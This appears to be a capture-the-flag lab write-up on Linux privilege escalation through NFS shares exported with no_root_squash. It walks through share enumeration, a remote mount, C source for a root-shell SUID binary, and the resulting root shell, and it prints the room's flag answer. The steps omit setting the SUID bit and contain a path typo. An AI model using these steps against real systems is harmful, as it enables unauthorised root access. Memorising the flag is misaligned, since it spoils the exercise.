Now it is time to enumerate for weaknesses in Network File Shares. This is the last new theory, so let’s get it over with.

Privilege escalation is not limited to local exploits—remote access vectors like SSH, Telnet, and NFS misconfigurations can also lead to root access.
#### Key Vectors:
1. Leaking Private Keys:
   - Finding a root SSH private key can allow direct root access instead of escalating privileges locally.
2. Exploiting NFS (Network File Sharing):
   - NFS configurations are stored in /etc/exports.
   - The “no_root_squash” option allows files created on the share to retain root privileges instead of being mapped to ```nfsnobody```.
   - This enables an attacker to:
      - Mount the share remotely.
      - Create an SUID executable that runs ```/bin/bash```.
      - Execute it on the target system with root privileges.
### Q.1: How many mountable shares can you identify on the target system?
enumerate mountable shares from our attacking machine we need to use the ```showmount -e <TARGET MACHINE IP>``` command.
```
└─$ showmount -e 10.201.24.12
Export list for 10.201.24.12:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```
From there on we can count three mountable shares.
### Answer: 3

### Q.2: How many shares have the "no_root_squash" option enabled?
To see this, run the command ```cat /etc/exports```. We can count three **no_root_squash** options in the bottom.
```
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
### Answer: 3

### Q.3: Gain a root shell on the target system
Create a folder in your **/tmp** directory for the mounting of the NFS share. not the one you are logged in as Karen, do this:
```mkdir /tmp/sharedfolder```

Then we can mount the drive:
```mount -o rw <target ip>:/home/ubuntu/sharedfolder /tmp/sharedfolder```

Now ```cd /tmp/sharedfolder``` directory and create a script file:```nano shell.c``` and insert below code

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  // ⬅️ Required for setuid and setgid

int main()
{ 
    setgid(0);             // Set group ID to root
    setuid(0);             // Set user ID to root
    system("/bin/bash");   // Launch a new bash shell
    return 0;
}
```
Then convert the saved **shell.c** file into an executable and compile it with the following command:
```gcc -static-libgcc -static shell.c -o shell ```

Switch over to the target(karen) machine and run the shell executable. 
If you file does not show up make sure you copied it to the folder where you mounted your share. 

Now go over to Karen's system and  ```cd /home/ubuntu/sharedfolderd``` and run ```ls -l``` command, 
```
$ ls
shell  shell.c
```
you would show 2 file, **shell** and **shell.c**. To gain root access run ```./shell``` file.

Now we got root!
```
root@ip-10-201-24-12:/home/ubuntu/sharedfolder# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```
### Answer: No answer needed

### Q.4: What is the content of the flag7.txt file?

Now we have root access, We've to find the flag and ```cat``` the flag: 
```
# find / -name flag7.txt 2>/dev/null
/home/matt/flag7.txt
# cat /home/matt/flag7.txt
THM-89384012
```
### Answer: THM-89384012

